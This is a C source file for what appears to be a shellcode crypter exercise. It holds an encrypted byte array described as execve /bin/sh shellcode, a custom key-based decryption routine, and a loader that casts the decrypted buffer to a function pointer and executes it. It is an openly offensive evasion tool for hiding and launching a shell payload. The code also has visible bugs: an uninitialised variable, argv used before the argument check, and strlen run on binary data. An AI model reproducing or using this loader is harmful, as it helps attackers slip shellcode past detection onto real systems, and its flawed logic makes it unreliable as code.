// Filename: customer-decrypter.c
// Not a secure algorithm!!


#include<stdio.h>	
#include<stdlib.h>
#include<string.h>


// Shellcode runs execve on /bin/sh (encrypted with ./custom-crypter test)

unsigned char encrypted_shellcode[] = \
"\x99\x28\xb8\xd0\x97\x97\xdb\xd0\xd0\x97\xca\xd1\xd6\xf1\x4b\xb8\xf1\x4a\xbb\xf1\x49\x18\x73\x35\xe8";


// Function which takes each nibble of byte in decryption_key and multiplies their difference and sum
int NibbleCalc(unsigned char keybyte)
{
	unsigned char nibble_one;
	unsigned char nibble_two;
	unsigned char tmp_result;
	unsigned char result;

	nibble_one = keybyte >> 4;
	nibble_two = keybyte & 0xf;

	result = (nibble_one + nibble_two) * (nibble_one - nibble_two);

	return result;
}


// Function which takes byte in encryption_key and transforms it based on the bytes' position in the encryption_key
unsigned char UniqueCalc(unsigned char keybyte, int i)
{
	unsigned char result;
	unsigned char tmp;

	if (i == 0) {
		result = keybyte;
		tmp = keybyte;
	} else if (i == 1) {
		result = keybyte - tmp;
	} else if (i > 1) {
		result = keybyte / i;
	}

	return result;
}

int main(int argc, char *argv[])
{

unsigned char encrypted_data_byte;
unsigned char key_byte;
unsigned char key_nibble;
unsigned char key_unique;
unsigned char decrypted_byte;
unsigned char *decryption_key;

int encrypted_shellcode_len;
int counter;

encrypted_shellcode_len=strlen(encrypted_shellcode);
decryption_key = argv[1];
unsigned char decrypted_shellcode[encrypted_shellcode_len];

// Usage error message
if (argc != 2) 
	{
		printf("Example Usage: ./custom-crypter <DECRYPTION_KEY>\r\n");
		printf("Exiting...\r\n");
		exit(1);	
	}

// Loop through each character in decryption_key
for (int i=0; i<strlen(decryption_key); i++) 
{
	key_byte = decryption_key[i];
	key_nibble = NibbleCalc(decryption_key[i]);
	key_unique = UniqueCalc(decryption_key[i], i);

	
	// Decrypt shellcode array based on each character in decryption_key
	for (counter=0; counter<encrypted_shellcode_len; counter++)
	{
		encrypted_data_byte = encrypted_shellcode[counter];
		decrypted_byte = encrypted_data_byte - key_byte - key_nibble - key_unique; 
		decrypted_shellcode[counter] = decrypted_byte;
	}

	// Copy encrypted_shellcode into shellcode for next encryption iteration
	memcpy(encrypted_shellcode, decrypted_shellcode, sizeof(encrypted_shellcode));

}

// Print encrypted shellcode byte array
for (int i=0; i<strlen(decrypted_shellcode); i++)
{
	unsigned char final_byte = decrypted_shellcode[i];
	printf("\\x%02x", final_byte);	
}

printf("\r\n");


// Execute decrypted shellcode
printf("Shellcode Length:  %d\n", strlen(decrypted_shellcode));

int (*ret)() = (int(*)())decrypted_shellcode;

ret();

}
